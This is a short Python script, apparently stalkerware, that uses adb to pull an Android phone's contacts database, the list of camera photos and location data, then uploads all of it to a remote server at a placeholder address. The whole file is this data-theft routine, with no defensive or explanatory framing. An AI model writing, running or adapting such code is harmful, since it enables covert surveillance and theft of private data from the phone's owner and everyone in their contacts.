import os
import requests
import subprocess

def send_data_to_server(data):
    url = 'http://yourserver.com/upload'
    response = requests.post(url, data=data)
    return response.status_code

def get_phone_data():
    contacts = subprocess.check_output(['adb', 'shell', 'cat', '/data/data/com.android.providers.contacts/databases/contacts2.db']).decode('utf-8')
    photos = subprocess.check_output(['adb', 'shell', 'ls', '/sdcard/DCIM/Camera']).decode('utf-8')
    location = subprocess.check_output(['adb', 'shell', 'dumpsys', 'location']).decode('utf-8')
    return contacts + photos + location

if __name__ == '__main__':
    phone_data = get_phone_data()
    status_code = send_data_to_server(phone_data)
    if status_code == 200:
        print("Data successfully sent to server")
    else:
        print("Failed to send data to server")
